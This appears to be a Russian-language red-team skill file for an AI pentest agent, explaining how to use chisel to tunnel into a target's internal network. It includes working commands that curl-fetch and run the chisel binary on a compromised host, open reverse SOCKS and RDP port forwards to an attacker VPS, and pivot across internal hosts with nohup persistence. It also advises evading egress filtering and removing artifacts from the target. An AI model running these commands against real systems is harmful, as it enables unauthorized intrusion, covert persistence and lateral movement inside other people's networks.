# chisel (HTTP-туннель / проброс портов)

> **Сначала загрузите конфигурацию VPS**: все `$REDTEAM_VPS_HOST` / `$VPS_USER` в этом навыке берутся из локальной конфигурации,
> при первом запуске их записывает `bash $DSH_HOME/redteam/setup.sh` в `$DSH_HOME/.env`. Перед каждой командой выполните source один раз:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Если ещё не настраивали, запустите один раз `setup.sh` (навык `redteam-setup`): он заодно проверит SSH-связность и сервис доставки payload.

`chisel` заворачивает TCP-трафик в **HTTP/WebSocket**, поэтому **легче всего проходит политики выхода в сеть, разрешающие только 80/443, и обратные прокси**.
Как он делит работу с suo5:

| | suo5 | chisel |
| --- | --- | --- |
| Условие входа | **обязателен WebShell** (HTTP-канал) | **достаточно выполнения команд** (лишь бы запускался бинарник) |
| Транспорт | длинное HTTP-соединение (маскируется под обычный запрос) | HTTP/WebSocket (upgrade) |
| Сильная сторона | вход во внутреннюю сеть с веб-точки, можно переиспользовать пользователя | вход во внутреннюю сеть из shell/RCE; гибкий проброс портов |
| Шумность | низкая (похоже на обычные веб-запросы) | низкая-средняя (признаки WebSocket заметнее) |

**Критерий выбора**: есть WebShell → в приоритете `suo5-tunnel`; есть только выполнение команд/RCE или нужен точный проброс порта → chisel.

## Бинарники на этой машине

| Файл | Путь |
| --- | --- |
| chisel (Linux amd64, сервер и клиент — один и тот же бинарник) | `$DSH_HOME/redteam/toolkit/chisel/chisel` (v1.12.0) |

Уже синхронизирован в каталог payload на VPS: `http://$REDTEAM_VPS_HOST:9100/` (цель может забрать напрямую через `curl`).

## 1. Обратный SOCKS (самый частый случай: цель сама подключается к нам)

```bash
# 1) поднять сервер на нашем VPS (запускать в tmux, чтобы разрыв SSH не убил процесс)
tmux new -s chisel
$DSH_HOME/redteam/toolkit/chisel/chisel server -p 9443 --reverse --socks5
#    --reverse  разрешает клиентам регистрировать обратный туннель
#    --socks5   включает встроенный SOCKS5 (порт работает, как только подключится клиент)
#    опционально усиление: --auth user:pass  добавить аутентификацию, чтобы не пользовались после сканирования
#    опционально маскировка: --backend http://127.0.0.1:80  перенаправлять веб-трафик на локальный сайт

# 2) запустить клиент на стороне цели (через имеющийся RCE/пункт выполнения команд; сначала загрузить бинарник)
curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c
/tmp/c client $REDTEAM_VPS_HOST:9443 R:socks
#    R:socks = обратный SOCKS; после подключения порт 1080 на VPS и есть точка входа SOCKS5 во внутреннюю сеть

# 3) с этой машины обращаться во внутреннюю сеть через SOCKS на VPS
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
#    в runs/proxychains-1080.conf укажите: socks5 $REDTEAM_VPS_HOST 1080
#    ⛔ не правьте системный /etc/proxychains4.conf, используйте -f с временным конфигом из runs/
```

## 2. Обратный проброс порта (вывести наружу порт из внутренней сети)

```bash
# сторона цели: пробросить внутренний 10.0.0.5:3389 на порт 13389 на VPS
/tmp/c client $REDTEAM_VPS_HOST:9443 R:13389:10.0.0.5:3389
# с этой машины: подключение к VPS:13389 и есть внутренний 3389
rdesktop $REDTEAM_VPS_HOST:13389
```

## 3. Прямой SOCKS (цель может подключаться к нам напрямую, но нам нужно самим идти в её внутреннюю сеть)

```bash
# поднять сервер на стороне цели
/tmp/c server -p 9443 --socks5
# поднять клиент у нас для локального проброса
chisel client <target>:9443 1080:socks
# дальше направить proxychains на 127.0.0.1:1080
```

## 4. Многоуровневая схема / связка

```bash
# уже есть туннель A (suo5 → 127.0.0.1:1080); через A поднять chisel на хосте B во внутренней сети
proxychains4 -f runs/proxychains-1080.conf \
  ssh user@10.0.0.6 "curl -s http://$REDTEAM_VPS_HOST:9100/chisel -o /tmp/c && chmod +x /tmp/c && nohup /tmp/c client $REDTEAM_VPS_HOST:9443 R:socks2 &"
# постепенно расширять зону доступа; каждый уровень регистрировать как туннель с достижимыми подсетями
```

## 5. Дисциплина и самосохранение

1. **Обязательно запускать в tmux / nohup**: при разрыве сессии туннель исчезает (`nohup ... &` или `tmux`).
2. **Добавляйте аутентификацию на сервере**: сервер chisel на публичном VPS будут сканировать, добавьте `--auth user:pass`, после работы закройте через `pkill`.
3. **Выбор порта**: не берите 80/443 (могут быть заняты другими сервисами на VPS), используйте высокие порты вроде 9443/8443;
   **в security group VPS порт должен быть открыт**.
4. **На стороне цели нужно убирать артефакты и файлы**: `/tmp/c` после работы можно удалить; не кладите бинарник в пути с характерными признаками.
5. **Не выдавайте прокси на собственном VPS за «прорыв»**: в регистрации туннеля `entry_kind` должен честно описывать сторону цели (см. ниже).

## 6. Вывод и запись в базу (обязательно)

1. **Регистрация туннеля `redteam_tunnel_add`**, все поля обязательны:
   - `kind`: `chisel`;
   - `listen`: **адрес прослушивания, которым реально может пользоваться пользователь** (например `$REDTEAM_VPS_HOST:1080` или `127.0.0.1:1080`);
   - `entry`: точка входа на стороне цели (например `клиент /tmp/c на 10.0.0.6 → VPS:9443`);
   - `reach`: **достижимые подсети** (например `10.0.0.0/24`, заполняйте по результатам проверки, не угадывайте);
   - `entry_kind`: **обязательно `target-outbound`** (обратное подключение с цели / клиент chisel запущен на цели) или
     `target-http` (через WebShell на цели), `target-agent` (через уже контролируемый процесс на цели);
     ⛔ если прокси поднят только на своём VPS, ставится `self-only` — такой туннель **помечается как «не прорыв»**;
   - `command`: полный текст команды (нужны обе части: сервер и клиент).
2. **Проверить связность на практике**: `curl --socks5-hostname <listen> http://<внутренняя цель>/` или `proxychains4 -f ... curl ...`,
   туннель считается работающим только после успешной проверки; затем `redteam_session_check` для записи статуса.
3. **Оценка**: туннель достигает внутренней сети → `redteam_score_hit` (`boundary`, в evidence писать «адрес туннеля｜достижимая подсеть｜внутренняя цель, до которой реально дошли»);
   латеральное перемещение через него на другие хосты → `server-host`.
4. **Передача пользователю**: дайте готовую к вставке конфигурацию — `socks5://<listen>` (либо способ `ssh -D` / проброса через frp на машину пользователя),
   укажите адрес и порт прослушивания и поясните, что этот туннель пересёк границу цели.
5. Каждое ключевое действие — `redteam_chain_add` (`stage_code=boundary-logical`), в `tool` — текст команды, в `result` — краткая выдержка вывода.
